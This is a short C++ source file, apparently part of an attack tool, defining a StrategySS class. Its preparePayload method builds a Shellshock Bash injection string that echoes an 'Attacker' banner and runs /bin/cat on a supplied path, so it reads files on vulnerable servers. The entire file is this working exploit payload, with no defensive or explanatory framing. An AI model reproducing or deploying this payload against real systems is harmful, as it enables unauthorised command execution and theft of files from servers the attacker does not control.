#include "StrategySS.hpp"
using namespace std;

StrategySS::StrategySS()
{

}

string StrategySS::preparePayload(string str)
{
	return "() { :;}; echo; echo \"Maudiy Attacker\"; /bin/cat"+str;
}

